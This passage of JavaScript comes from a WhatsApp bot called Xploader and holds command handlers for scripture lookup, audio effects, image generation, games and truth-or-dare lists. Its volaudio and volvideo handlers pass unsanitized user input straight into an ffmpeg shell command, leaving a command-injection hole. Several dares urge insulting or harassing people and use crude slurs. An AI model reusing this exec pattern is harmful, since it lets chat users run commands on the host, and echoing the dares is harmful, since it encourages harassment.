            // Encode the chapterInput to handle special characters
            chapterInput = encodeURIComponent(chapterInput);
            // Make an API request to fetch the chapter information.
            let chapterRes = await fetch(`${BASE_URL}/${chapterInput}`);
            if (!chapterRes.ok) {
              throw new Error(
                `Please specify the chapter number or name. Example: ${
                  prefix + command
                } john 3:16`
              );
            }
            let chapterData = await chapterRes.json();
            let translatedChapterHindi = await translate(chapterData.text, {
              to: "hi",
              autoCorrect: true,
            });
            let translatedChapterEnglish = await translate(chapterData.text, {
              to: "en",
              autoCorrect: true,
            });
            let bibleChapter = `
📖 *The Holy Bible*\n
📜 *Chapter ${chapterData.reference}*\n
Type: ${chapterData.translation_name}\n
Number of verses: ${chapterData.verses.length}\n
🔮 *Chapter Content (English):*\n
${translatedChapterEnglish.text}\n
🔮 *Chapter Content (Hindi):*\n
${translatedChapterHindi.text}`;
            reply(bibleChapter);
          } catch (error) {
            reply(`Error: ${error.message}`);
          }
        }
        break;
//=================================================//
case "quran":
        {
          try {
            // Extract the surah number or name from the command text.
            let surahInput = m.text.split(" ")[1];
            if (!surahInput) {
              throw new Error(`Please specify the surah number or name`);
            }
            let surahListRes = await fetch(
              "https://quran-endpoint.vercel.app/quran"
            );
            let surahList = await surahListRes.json();
            let surahData = surahList.data.find(
              (surah) =>
                surah.number === Number(surahInput) ||
                surah.asma.ar.short.toLowerCase() ===
                  surahInput.toLowerCase() ||
                surah.asma.en.short.toLowerCase() === surahInput.toLowerCase()
            );
            if (!surahData) {
              throw new Error(
                `Couldn't find surah with number or name "${surahInput}"`
              );
            }
            let res = await fetch(
              `https://quran-endpoint.vercel.app/quran/${surahData.number}`
            );
            if (!res.ok) {
              let error = await res.json();
              throw new Error(
                `API request failed with status ${res.status} and message ${error.message}`
              );
            }

            let json = await res.json();

            // Translate tafsir from Bahasa Indonesia to Urdu
            let translatedTafsirUrdu = await translate(json.data.tafsir.id, {
              to: "ur",
              autoCorrect: true,
            });

            // Translate tafsir from Bahasa Indonesia to English
            let translatedTafsirEnglish = await translate(json.data.tafsir.id, {
              to: "en",
              autoCorrect: true,
            });

            let quranSurah = `
🕌 *Quran: The Holy Book*\n
📜 *Surah ${json.data.number}: ${json.data.asma.ar.long} (${json.data.asma.en.long})*\n
Type: ${json.data.type.en}\n
Number of verses: ${json.data.ayahCount}\n
🔮 *Explanation (Urdu):*\n
${translatedTafsirUrdu.text}\n
🔮 *Explanation (English):*\n
${translatedTafsirEnglish.text}`;

            reply(quranSurah);

            if (json.data.recitation.full) {
              Xploader.sendMessage(
                m.chat,
                {
                  audio: { url: json.data.recitation.full },
                  mimetype: "audio/mp4",
                  ptt: true,
                  fileName: `recitation.mp3`,
                },
                { quoted: m }
              );
            }
          } catch (error) {
            reply(`Error: ${error.message}`);
          }
        }
        break;
//=================================================//
case "fliptext":
        {
          if (args.length < 1)
            return reply(`Example:\n${prefix}fliptext SalmanSer`);
          quere = args.join(" ");
          flipe = quere.split("").reverse().join("");
          reply(
            `\`\`\`「 FLIP TEXT 」\`\`\`\n\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`
          );
        }
        break;
//=================================================//
      case "toqr":
        {
          if (!q) return reply(" Please include link or text!");
          const QrCode = require("qrcode-reader");
          const qrcode = require("qrcode");
          let qyuer = await qrcode.toDataURL(q, { scale: 35 });
          let data = new Buffer.from(
            qyuer.replace("data:image/png;base64,", ""),
            "base64"
          );
          let buff = getRandom(".jpg");
          await fs.writeFileSync("./" + buff, data);
          let medi = fs.readFileSync("./" + buff);
          await Xploader.sendMessage(
            from,
            { image: medi, caption: "©𝐗𝐩𝐥𝐨𝐚𝐝𝐞𝐫𝐁𝐨𝐭" },
            { quoted: m }
          );
          setTimeout(() => {
            fs.unlinkSync(buff);
          }, 10000);
        }
        break;
//=================================================//
      case "volaudio":
        {
          if (!args.join(" "))
            return reply(`Example: ${prefix + command} 10`);
          media = await Xploader.downloadAndSaveMediaMessage(
            quoted,
            "volume"
          );
          rname = getRandom(".mp3");
          exec(
            `ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`,
            (err, stderr, stdout) => {
              fs.unlinkSync(media);
              if (err) return reply("Error!");
              jadie = fs.readFileSync(rname);
              Xploader.sendMessage(
                from,
                { audio: jadie, mimetype: "audio/mp4", ptt: true },
                { quoted: m }
              );
              fs.unlinkSync(rname);
            }
          );
        }
        break;
//=================================================//
      case "volvideo":
        {
          if (!args.join(" "))
            return reply(`Example: ${prefix + command} 10`);
          media = await Xploader.downloadAndSaveMediaMessage(
            quoted,
            "volume"
          );
          rname = getRandom(".mp4");
          exec(
            `ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`,
            (err, stderr, stdout) => {
              fs.unlinkSync(media);
              if (err) return reply("Error!");
              jadie = fs.readFileSync(rname);
              Xploader.sendMessage(
                from,
                { video: jadie, mimetype: "video/mp4" },
                { quoted: m }
              );
              fs.unlinkSync(rname);
            }
          );
        }
        break;
      case "bass":
      case "blown":
      case "deep":
      case "earrape":
      case "fast":
      case "fat":
      case "nightcore":
      case "reverse":
      case "robot":
      case "slow":
      case "smooth":
      case "squirrel":
        try {
          let set;
          if (/bass/.test(command))
            set = "-af equalizer=f=54:width_type=o:width=2:g=20";
          if (/blown/.test(command)) set = "-af acrusher=.1:1:64:0:log";
          if (/deep/.test(command)) set = "-af atempo=4/4,asetrate=44500*2/3";
          if (/earrape/.test(command)) set = "-af volume=12";
          if (/fast/.test(command))
            set = '-filter:a "atempo=1.63,asetrate=44100"';
          if (/fat/.test(command))
            set = '-filter:a "atempo=1.6,asetrate=22100"';
          if (/nightcore/.test(command))
            set = "-filter:a atempo=1.06,asetrate=44100*1.25";
          if (/reverse/.test(command)) set = '-filter_complex "areverse"';
          if (/robot/.test(command))
            set =
              "-filter_complex \"afftfilt=real='hypot(re,im)*sin(0)':imag='hypot(re,im)*cos(0)':win_size=512:overlap=0.75\"";
          if (/slow/.test(command))
            set = '-filter:a "atempo=0.7,asetrate=44100"';
          if (/smooth/.test(command))
            set =
              "-filter:v \"minterpolate='mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120'\"";
          if (/squirrel/.test(command))
            set = '-filter:a "atempo=0.5,asetrate=65100"';
          if (/audio/.test(mime)) {           
            let media = await Xploader.downloadAndSaveMediaMessage(quoted);
            let ran = getRandom(".mp3");
            exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
              fs.unlinkSync(media);
              if (err) return reply(err);
              let buff = fs.readFileSync(ran);
              Xploader.sendMessage(
                m.chat,
                { audio: buff, mimetype: "audio/mpeg" },
                { quoted: m }
              );
              fs.unlinkSync(ran);
            });
          } else
            reply(
              `Reply to the audio you want to change with a caption *${
                prefix + command
              }*`
            );
        } catch (e) {
          reply(e);
        }
        break;
//=================================================//
   case "say":
      case "tts":
        {
          if (!text) return reply("Where is the text?");
          //Limit text to maximum supported 200 characters!
          let texttts = text.substring(0, 200);
          const XpBotrl = googleTTS.getAudioUrl(texttts, {
            lang: "en",
            slow: false,
            host: "https://translate.google.com",
          });
          return Xploader.sendMessage(
            m.chat,
            {
              audio: {
                url: XpBotrl,
              },
              mimetype: "audio/mp4",
              ptt: true,
              fileName: `${text}.mp3`,
            },
            {
              quoted: m,
            }
          );
        }
        break;
//=================================================//
      case "translate":
      case "trt":
        {
          if (!q)
            return reply(
              `*Where is the text*\n\n*𝙴xample*\n*${
                prefix + command
              } <language id> <text>*\n*${prefix + command} ja yo wassup*`
            );
          const defaultLang = "en";
          const tld = "cn";
          let err = `
 *Example:*

*${prefix + command}* <id> [text]
*${prefix + command}* en Hello World

≡ *List of supported languages:* 
https://cloud.google.com/translate/docs/languages
`.trim();
          let lang = args[0];
          let text = args.slice(1).join(" ");
          if ((args[0] || "").length !== 2) {
            lang = defaultLang;
            text = args.join(" ");
          }
          if (!text && m.quoted && m.quoted.text) text = m.quoted.text;
          try {
            let result = await translate(text, {
              to: lang,
              autoCorrect: true,
            }).catch((_) => null);
            reply(result.text);
          } catch (e) {
            return reply(err);
          }
        }
        break;
//=================================================//
      case "lyrics":
        {
          if (!text)
            return reply(
              `Please provide a song name!`
            );
          let lyric = await fetch(
            `https://widipe.com/lirik?text=${text}`
          );
          let jsonXpBot = await lyric.json();
          if (jsonXpBot.result.error) {
            reply("Lyrics not found.");
          } else {
            reply(
              `*Artist*: ${jsonXpBot.result.artist}\n*Lyrics*:\n${jsonXpBot.result.lyrics}`
            );
          }
        }
     break;
//=================================================//
    case "truthdetector":
    case "liedetector":
        { 
          if (!m.quoted)
            return reply(
              `Please reply to the message you want to detect!`
            );
          let ukweli = [`Thats a good lie!`, `Its a lie!`, `Its the truth!`, `Thats true!`, `Professional lier I see!`, `Truth!`, `False!`, `Im unable to detect this one!`];
          let uwongo = ukweli[Math.floor(Math.random() * ukweli.length)];
          let jibu = `*Result* : ${uwongo}`;
          await reply(jibu);
        }
        break;
//=================================================//
  case "dalle":
  {
        if (!q) return reply(`Please provide a query to generate an image. Example: ${prefix + command} Beautiful landscape`);
        const apiUrl = `https://widipe.com/dalle?text=${encodeURIComponent(q)}`;
        try {
          await Xploader.sendMessage(m.chat, { image: { url: apiUrl } }, { quoted: m });
        } catch (error) {
          console.error(error);
          reply("An error occurred while generating the image.");
        }
      }
        break;
//=================================================//
  case "imagen":
  {
        if (!q) return reply(`Please provide a query to generate an image. Example: ${prefix + command} Beautiful landscape`);
        const api2Url = `https://widipe.com/ai/text2img?text=${encodeURIComponent(q)}`;
        try {
          await Xploader.sendMessage(m.chat, { image: { url: api2Url } }, { quoted: m });
        } catch (error) {
          console.error(error);
          reply("An error occurred while generating the image.");
        }
      }
        break;
//=================================================//
 case "generate":
  {
        if (!q) return reply(`Please provide a query to generate an image. Example: ${prefix + command} Beautiful landscape`);
        const api3Url = `https://widipe.com/v6/text2img?text=${encodeURIComponent(q)}`;
        try {
          await Xploader.sendMessage(m.chat, { image: { url: api3Url } }, { quoted: m });
        } catch (error) {
          console.error(error);
          reply("An error occurred while generating the image.");
        }
      }
        break;
//=================================================//
      case "mathquiz":
      case "maths":
        {
          if (kuismath.hasOwnProperty(m.sender.split("@")[0]))
            reply(`There are still unfinished sessions!`);
          let { genMath, modes } = require("./lib/math");
          if (!text)
            return reply(
              `Mode: ${Object.keys(modes).join(
                " | "
              )}\nUse example: ${prefix}math medium`
            );
          let result = await genMath(text.toLowerCase());
          Xploader.sendText(
            m.chat,
            `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(
              result.waktu / 1000
            ).toFixed(2)} second`,
            m
          ).then(() => {
            kuismath[m.sender.split("@")[0]] = result.jawaban;
          });
          await sleep(result.waktu);
          if (kuismath.hasOwnProperty(m.sender.split("@")[0])) {
            console.log("Answer: " + result.jawaban);
            reply(
              "Time has run out\nAnswer: " + kuismath[m.sender.split("@")[0]]
            );
            delete kuismath[m.sender.split("@")[0]];
          }
        }
        break;
//=================================================//
      case "rockpaperscissors":
      case "rps":
        {
          this.suit = this.suit ? this.suit : {};
          let poin = 10;
          let poin_lose = 10;
          let timeout = 60000;
          if (
            Object.values(this.suit).find(
              (roof) =>
                roof.id.startsWith("suit") &&
                [roof.p, roof.p2].includes(m.sender)
            )
          )
            reply(`Finish your previous RPS game.`);
          if (m.mentionedJid[0] === m.sender)
            return reply(`Can't play with yourself. !`);
          if (!m.mentionedJid[0])
            return reply(
              `_Who do you want to challenge?_\nTag the person aswell..\n\nExample : ${prefix}rps @${owner[1]}`,
              m.chat,
              {
                mentions: [owner[1] + "@s.whatsapp.net"],
              }
            );
          if (
            Object.values(this.suit).find(
              (roof) =>
                roof.id.startsWith("suit") &&
                [roof.p, roof.p2].includes(m.mentionedJid[0])
            )
          )
            return reply(
              `The person you are challenging is playing rps with someone else :(`
            );
          let id = "suit_" + new Date() * 1;
          let caption = `_*ROCK PAPER SCISSORS*_

@${m.sender.split`@`[0]} challenged @${
            m.mentionedJid[0].split`@`[0]
          } to play rock paper scissors

@${m.mentionedJid[0].split`@`[0]} Please type *accept* or *reject*...`;
          this.suit[id] = {
            chat: await Xploader.sendText(m.chat, caption, m, {
              mentions: parseMention(caption),
            }),
            id: id,
            p: m.sender,
            p2: m.mentionedJid[0],
            status: "wait",
            waktu: setTimeout(() => {
              if (this.suit[id])
                Xploader.sendText(m.chat, `_Game time is up_`, m);
              delete this.suit[id];
            }, 60000),
            poin,
            poin_lose,
            timeout,
          };
        }
        break;
//=================================================//
     case "tictactoe":
     case "ttc":
        {
          let TicTacToe = require("./lib/tictactoe");
          this.game = this.game ? this.game : {};
          if (
            Object.values(this.game).find(
              (room) =>
                room.id.startsWith("tictactoe") &&
                [room.game.playerX, room.game.playerO].includes(m.sender)
            )
          )
            return reply("You are still in the game");
          let room = Object.values(this.game).find(
            (room) =>
              room.state === "WAITING" && (text ? room.name === text : true)
          );
          if (room) {
            reply("Partner not found!");
            room.o = m.chat;
            room.game.playerO = m.sender;
            room.state = "PLAYING";
            let arr = room.game.render().map((v) => {
              return {
                X: "❌",
                O: "⭕",
                1: "1️⃣",
                2: "2️⃣",
                3: "3️⃣",
                4: "4️⃣",
                5: "5️⃣",
                6: "6️⃣",
                7: "7️⃣",
                8: "8️⃣",
                9: "9️⃣",
              }[v];
            });
            let str = `Room ID: ${room.id}

${arr.slice(0, 3).join("")}
${arr.slice(3, 6).join("")}
${arr.slice(6).join("")}

Wait @${room.game.currentTurn.split("@")[0]}

Type *surrender* to give up and admit defeat`;
            if (room.x !== room.o)
              await Xploader.sendText(room.x, str, m, {
                mentions: parseMention(str),
              });
            await Xploader.sendText(room.o, str, m, {
              mentions: parseMention(str),
            });
          } else {
            room = {
              id: "tictactoe-" + +new Date(),
              x: m.chat,
              o: "",
              game: new TicTacToe(m.sender, "o"),
              state: "WAITING",
            };
            if (text) room.name = text;
            reply(
              "Waiting for partner" +
                (text
                  ? ` type the command below ${prefix}${command} ${text}`
                  : "")
            );
            this.game[room.id] = room;
          }
        }
        break;
      case "delttc":
      case "deltictactoe":
        {
          this.game = this.game ? this.game : {};
          try {
            if (this.game) {
              delete this.game;
              Xploader.sendText(
                m.chat,
                `Berhasil delete session TicTacToe`,
                m
              );
            } else if (!this.game) {
              reply(`Session TicTacToe🎮 tidak ada`);
            } else mewReply("?");
          } catch (e) {
            reply("rusak");
          }
        }
        break;
//=================================================//
      case "xxqc":
        {
          if (!q)
            return reply(
              `📌Example: ${
                prefix + command
              } pink hallo\n\n꒰ 🖌️ Color List ꒱ ೄྀ࿐ ˊˎ-\n━━━━━━⊱⋆⊰━━━━━━\npink\nblue\nred\ngreen\nyellow\npurple\ndarkblue\nlightblue\nash\norange\nblack\nwhite\nteal\nlightpink\nchocolate\nsalmon\nmagenta\ntan\nwheat\ndeeppink\nfire\nskyblue\nsafron\nbrightskyblue\nhotpink\nlightskyblue\nseagreen\ndarkred\norangered\ncyan\nviolet\nmossgreen\ndarkgreen\nnavyblue\ndarkorange\ndarkpurple\nfuchsia\ndarkmagenta\ndarkgray\npeachpuff\nblackishgreen\ndarkishred\ngoldenrod\ndarkishgray\ndarkishpurple\ngold\nsilver`
            );
          if (text.length > 100) return reply(`Max 100 character.`);
          let [color, ...message] = text.split(" ");
          message = message.join(" ");
          let backgroundColor;
          switch (color) {
            case "pink":
              backgroundColor = "#f68ac9";
              break;
            case "blue":
              backgroundColor = "#6cace4";
              break;
            case "red":
              backgroundColor = "#f44336";
              break;
            case "green":
              backgroundColor = "#4caf50";
              break;
            case "yellow":
              backgroundColor = "#ffeb3b";
              break;
            case "purple":
              backgroundColor = "#9c27b0";
              break;
            case "darkblue":
              backgroundColor = "#0d47a1";
              break;
            case "lightblue":
              backgroundColor = "#03a9f4";
              break;
            case "ash":
              backgroundColor = "#9e9e9e";
              break;
            case "orange":
              backgroundColor = "#ff9800";
              break;
            case "black":
              backgroundColor = "#000000";
              break;
            case "white":
              backgroundColor = "#ffffff";
              break;
            case "teal":
              backgroundColor = "#008080";
              break;
            case "lightpink":
              backgroundColor = "#FFC0CB";
              break;
            case "chocolate":
              backgroundColor = "#A52A2A";
            case "salmon":
              backgroundColor = "#FFA07A";
              break;
            case "magenta":
              backgroundColor = "#FF00FF";
              break;
            case "tan":
              backgroundColor = "#D2B48C";
              break;
            case "wheat":
              backgroundColor = "#F5DEB3";
              break;
            case "deeppink":
              backgroundColor = "#FF1493";
              break;
            case "fire":
              backgroundColor = "#B22222";
              break;
            case "skyblue":
              backgroundColor = "#00BFFF";
              break;
            case "orange":
              backgroundColor = "#FF7F50";
              break;
            case "brightskyblue":
              backgroundColor = "#1E90FF";
              break;
            case "hotpink":
              backgroundColor = "#FF69B4";
              break;
            case "lightskyblue":
              backgroundColor = "#87CEEB";
              break;
            case "seagreen":
              backgroundColor = "#20B2AA";
              break;
            case "darkred":
              backgroundColor = "#8B0000";
              break;
            case "orangered":
              backgroundColor = "#FF4500";
              break;
            case "cyan":
              backgroundColor = "#48D1CC";
              break;
            case "violet":
              backgroundColor = "#BA55D3";
              break;
            case "mossgreen":
              backgroundColor = "#00FF7F";
              break;
            case "darkgreen":
              backgroundColor = "#008000";
              break;
            case "navyblue":
              backgroundColor = "#191970";
              break;
            case "darkorange":
              backgroundColor = "#FF8C00";
              break;
            case "darkpurple":
              backgroundColor = "#9400D3";
              break;
            case "fuchsia":
              backgroundColor = "#FF00FF";
              break;
            case "darkmagenta":
              backgroundColor = "#8B008B";
              break;
            case "darkgray":
              backgroundColor = "#2F4F4F";
              break;
            case "peachpuff":
              backgroundColor = "#FFDAB9";
              break;
            case "darkishgreen":
              backgroundColor = "#BDB76B";
              break;
            case "darkishred":
              backgroundColor = "#DC143C";
              break;
            case "goldenrod":
              backgroundColor = "#DAA520";
              break;
            case "darkishgray":
              backgroundColor = "#696969";
              break;
            case "darkishpurple":
              backgroundColor = "#483D8B";
              break;
            case "gold":
              backgroundColor = "#FFD700";
              break;
            case "silver":
              backgroundColor = "#C0C0C0";
              break;
            default:
              return reply("The selected color is not available.");
          }
          let obj = {
            type: "quote",
            format: "png",
            backgroundColor,
            width: 512,
            height: 768,
            scale: 2,
            messages: [
              {
                entities: [],
                avatar: true,
                from: {
                  id: 1,
                  name: pushname,
                  photo: {
                    url: await Xploader.profilePictureUrl(
                      m.sender,
                      "image"
                    ).catch(
                      () =>
                        "https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60"
                    ),
                  },
                },
                text: message,
                replyMessage: {},
              },
            ],
          };
          let response = await axios.post(
            "https://bot.lyo.su/quote/generate",
            obj,
            {
              headers: {
                "Content-Type": "application/json",
              },
            }
          );
          let buffer = Buffer.from(response.data.result.image, "base64");
          Xploader.sendImageAsSticker(m.chat, buffer, m, {
            packname: `${global.packname}`,
            author: `${global.author}`,
          });
        }
        break;
//=================================================//
      case "randomgirl":
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/tiktokpics/random.json")
        );
        var hasil = pickRandom(notnot);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
      case "randomboy":
        var notnot = JSON.parse(
          fs.readFileSync("./src/media/tiktokpics/random2.json")
        );
        var hasil = pickRandom(notnot);
        Xploader.sendMessage(
          m.chat,
          { caption: mess.success, image: { url: hasil.url } },
          { quoted: m }
        );
        break;
//=================================================//
      case "remini":
      case "enhance":
      case "hd":
        {
          if (!quoted) return reply(`Where is the picture?`);
          if (!/image/.test(mime))
            return reply(
              `Send/Reply Photos With Captions ${prefix + command}`
            );
          const { remini } = require("./lib/remini");
          let media = await quoted.download();
          let proses = await remini(media, "enhance");
          Xploader.sendMessage(
            m.chat,
            { image: proses, caption: mess.success },
            { quoted: m }
          );
        }
        break;
      case "define":
        if (!q) return reply(`What do you want to define?`);
        try {
          targetfine = await axios.get(
            `http://api.urbandictionary.com/v0/define?term=${q}`
          );
          if (!targetfine) return reply(mess.error);
          const reply = `
*${themeemoji} Word:* ${q}
*${themeemoji} Definition:* ${targetfine.data.list[0].definition
            .replace(/\[/g, "")
            .replace(/\]/g, "")}
*${themeemoji} Example:* ${targetfine.data.list[0].example
            .replace(/\[/g, "")
            .replace(/\]/g, "")}`;
          Xploader.sendMessage(m.chat, { text: reply }, { quoted: m });
        } catch (err) {
          console.log(err);
          return reply(`*${q}* isn't a valid text`);
        }
        break;
//=================================================//
      case "rate":
        {
          if (!text)
            return reply(`Example : ${prefix + command} my profile`);
          let kah = getRandomNumber(0, 100);
          let jawab = `*Rate ${text}*\nAnswer : ${kah}%`;
          await reply(jawab);
        }
        break;
//=================================================//
      case "soulmate":
        {
          if (!m.isGroup) return reply(mess.group);
          let member = participants.map((u) => u.id);
          let me = m.sender;
          let jodoh = member[Math.floor(Math.random() * member.length)];
          Xploader.sendMessage(
            m.chat,
            {
              text: `👫Your Soulmate Is

@${me.split("@")[0]} ❤️ @${jodoh.split("@")[0]}`,
              contextInfo: {
                mentionedJid: [me, jodoh],
                forwardingScore: 9999999,
                isForwarded: true,
                externalAdReply: {
                  showAdAttribution: true,
                  containsAutoReply: true,
                  title: ` ${global.botname}`,
                  body: `${ownername}`,
                  previewType: "PHOTO",
                  thumbnailUrl: ``,
                  thumbnail: fs.readFileSync(
                    `./XploaderMedia/theme/xliconpic.jpg`
                  ),
                  sourceUrl: `${wagc}`,
                },
              },
            },
            { quoted: m }
          );
        }
        break;
      case "couple":
        {
          if (!m.isGroup) return reply(mess.group);
          let member = participants.map((u) => u.id);
          let orang = member[Math.floor(Math.random() * member.length)];
          let jodoh = member[Math.floor(Math.random() * member.length)];
          Xploader.sendMessage(
            m.chat,
            {
              text: `@${orang.split("@")[0]} ❤️ @${jodoh.split("@")[0]}
Cieeee, What's Going On❤️💖👀`,
              contextInfo: {
                mentionedJid: [orang, jodoh],
                forwardingScore: 9999999,
                isForwarded: true,
                externalAdReply: {
                  showAdAttribution: true,
                  containsAutoReply: true,
                  title: ` ${global.botname}`,
                  body: `${ownername}`,
                  previewType: "PHOTO",
                  thumbnailUrl: ``,
                  thumbnail: fs.readFileSync(
                    `./XploaderMedia/theme/Xploader2.jpg`
                  ),
                  sourceUrl: `${wagc}`,
                },
              },
            },
            { quoted: m }
          );
        }
        break;
//=================================================//
      case "wallpaper":
        {
          if (!text) return reply("Enter Query Title");
          let { wallpaper } = require("./lib/scraper");
          anuwallpep = await wallpaper(text);
          result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)];
          Xploader.sendMessage(
            m.chat,
            {
              caption: `${themeemoji} Title : ${
                result.title
              }\n${themeemoji} Category : ${
                result.type
              }\n${themeemoji} Detail : ${
                result.source
              }\n${themeemoji} Media Url : ${
                result.image[2] || result.image[1] || result.image[0]
              }`,
              image: { url: result.image[0] },
            },
            { quoted: m }
          );
        }
        break;
      case "wikimedia":
        {
          if (!text) return reply("Enter Query Title");
          let { wikimedia } = require("./lib/scraper");
          let anumedia = await wikimedia(text);
          result = anumedia[Math.floor(Math.random() * anumedia.length)];
          Xploader.sendMessage(
            m.chat,
            {
              caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}`,
              image: { url: result.image },
            },
            { quoted: m }
          );
        }
        break;
//=================================================//
      case "pick":
        {
          if (!m.isGroup) return reply(mess.group);
          if (!text)
            return reply(
              `What do you want to pick?\nExample: ${prefix + command} idiot`
            );
          const groupMetadata = m.isGroup
            ? await Xploader.groupMetadata(m.chat).catch((e) => {})
            : "";
          const participants = m.isGroup
            ? await groupMetadata.participants
            : "";
          let member = participants.map((u) => u.id);
          let me = m.sender;
          let XpBotshimts = member[Math.floor(Math.random() * member.length)];
          Xploader.sendMessage(
            from,
            {
              text: `The most *${text}* here is *@${XpBotshimts.split("@")[0]}*`,
              contextInfo: {
                forwardingScore: 9999999,
                isForwarded: true,
                mentionedJid: [XpBotshimts],
                externalAdReply: {
                  showAdAttribution: true,
                  title: ` ${global.botname}`,
                  body: `${ownername}`,
                  containsAutoReply: true,
                  previewType: "PHOTO",
                  thumbnailUrl: ``,
                  thumbnail: fs.readFileSync(
                    `./XploaderMedia/theme/xliconpic.jpg`
                  ),
                  sourceUrl: `${wagc}`,
                },
              },
            },
            { quoted: m }
          );
        }
        break;
//=================================================//
      case "fact":
        {
          const { data } = await axios.get(`https://nekos.life/api/v2/fact`);
          return reply(`${themeemoji} *Fact:* ${data.fact}\n`);
        }
        break;
      case "quotes":
        const quoteXpBot = await axios.get(`https://favqs.com/api/qotd`);
        const textquotes = `*${themeemoji} Quote:* ${quoteXpBot.data.quote.body}\n\n*${themeemoji} Author:* ${quoteXpBot.data.quote.author}`;
        return reply(textquotes);
        break;
      case "dare":
        const dare = [
          "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
          "spill people who make you pause",
          "call crush/pickle now and send ss",
          "drop only emote every time you type on gc/pc for 1 day.",
          "say Welcome to Who Wants To Be a Millionaire! to all the groups you have",
          "call ex saying miss",
          "sing the chorus of the last song you played",
          "vn your ex/crush/girlfriend, says hi (name), wants to call, just a moment. I miss you so much",
          "Bang on the table (which is at home) until you get scolded for being noisy",
          "Tell random people _I was just told I was your twin first, we separated, then I had plastic surgery. And this is the most ciyusss_ thing",
          "mention ex's name",
          "make 1 rhyme for the members!",
          "send ur whatsapp chat list",
          "chat random people with gheto language then ss here",
          "tell your own version of embarrassing things",
          "tag the person you hate",
          "Pretending to be possessed, for example: possessed by dog, possessed by grasshoppers, possessed by refrigerator, etc.",
          "change name to *I AM DONKEY* for 24 hours",
          "shout *ma chuda ma chuda ma chuda* in front of your house",
          "snap/post boyfriend photo/crush",
          "tell me your boyfriend type!",
          "say *i hv crush on you, do you want to be my girlfriend?* to the opposite sex, the last time you chatted (submit on wa/tele), wait for him to reply, if you have, drop here",
          "record ur voice that read *titar ke age do titar, titar ke piche do titar*",
          "prank chat ex and say *i love u, please come back.* without saying dare!",
          "chat to contact wa in the order according to your battery %, then tell him *i am lucky to hv you!*",
          "change the name to *I am a child of randi* for 5 hours",
          "type in bengali 24 hours",
          "Use selmon bhoi photo for 3 days",
          "drop a song quote then tag a suitable member for that quote",
          "send voice note saying can i call u baby?",
          "ss recent call whatsapp",
          "Say *YOU ARE SO BEAUTIFUL DON'T LIE* to guys!",
          "pop to a group member, and say fuck you",
          "Act like a chicken in front of ur parents",
          "Pick up a random book and read one page out loud in vn n send it here",
          "Open your front door and howl like a wolf for 10 seconds",
          "Take an embarrassing selfie and paste it on your profile picture",
          "Let the group choose a word and a well known song. You have to sing that song and send it in voice note",
          "Walk on your elbows and knees for as long as you can",
          "sing national anthem in voice note",
          "Breakdance for 30 seconds in the sitting roomðŸ˜‚",
          "Tell the saddest story you know",
          "make a twerk dance video and put it on status for 5mins",
          "Eat a raw piece of garlic",
          "Show the last five people you texted and what the messages said",
          "put your full name on status for 5hrs",
          "make a short dance video without any filter just with a music and put it on ur status for 5hrs",
          "call ur bestie, bitch",
          "put your photo without filter on ur status for 10mins",
          "say i love oli london in voice noteðŸ¤£ðŸ¤£",
          "Send a message to your ex and say I still like you",
          "call Crush/girlfriend/bestie now and screenshot here",
          "pop to one of the group member personal chat and Say you ugly bustard",
          "say YOU ARE BEAUTIFUL/HANDSOME to one of person who is in top of ur pinlist or the first person on ur chatlist",
          "send voice notes and say, can i call u baby, if u r boy tag girl/if girl tag boy",
          "write i love you (random grup member name, who is online) in personal chat, (if u r boy write girl name/if girl write boy name) take a snap of the pic and send it here",
          "use any bollywood actor photo as ur pfp for 3 days",
          "put your crush photo on status with caption, this is my crush",
          "change name to I AM GAY for 5 hours",
          "chat to any contact in whatsapp and say i will be ur bf/gf for 5hours",
          "send voice note says i hv crush on you, want to be my girlfriend/boyfriend or not? to any random person from the grup(if u girl choose boy, if boy choose girl",
          "slap ur butt hardly send the sound of slap through voice noteðŸ˜‚",
          "state ur gf/bf type and send the photo here with caption, ugliest girl/boy in the world",
          "shout bravooooooooo and send here through voice note",
          "snap your face then send it here",
          "Send your photo with a caption, i am lesbian",
          "shout using harsh words and send it here through vn",
          "shout you bastard in front of your mom/papa",
          "change the name to i am idiot for 24 hours",
          "slap urself firmly and send the sound of slap through voice noteðŸ˜‚",
          "say i love the bot owner Tylor through voice note",
          "send your gf/bf pic here",
          "make any tiktok dance challenge video and put it on status, u can delete it after 5hrs",
          "breakup with your best friend for 5hrs without telling him/her that its a dare",
          "tell one of your frnd that u love him/her and wanna marry him/her, without telling him/her that its a dare",
          "say i love depak kalal through voice note",
          "write i am feeling horny and put it on status, u can delete it only after 5hrs",
          "write i am lesbian and put it on status, u can delete only after 5hrs",
          "kiss your mommy or papa and say i love youðŸ˜Œ",
          "put your father name on status for 5hrs",
          "send abusive words in any grup, excepting this grup, and send screenshot proof here",
        ];
        const XpBotdare = dare[Math.floor(Math.random() * dare.length)];
        bufferdare = await getBuffer(
          `https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`
        );
        Xploader.sendMessage(
          from,
          { image: bufferdare, caption: "_You choose DARE_\n" + XpBotdare },
          { quoted: m }
        );
        break;
        break;
      case "truth":
        const truth = [
          "Have you ever liked anyone? How long?",
          "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
          "Have you ever liked someone and felt that person likes you too?",
          "What is the name of your friend's ex-girlfriend that you used to secretly like?",
          "Have you ever stolen money from your father or mom? The reason?",
          "What makes you happy when you're sad?",
          "Ever had a one sided love? if so who? how does it feel bro?",
          "been someone's mistress?",
          "the most feared thing",
          "Who is the most influential person in your life?",
          "what proud thing did you get this year",
          "Who is the person who can make you awesome",
          "Who is the person who has ever made you very happy?",
          "Who is closest to your ideal type of partner here",
          "Who do you like to play with??",
          "Have you ever rejected people? the reason why?",
          "Mention an incident that made you hurt that you still remember",
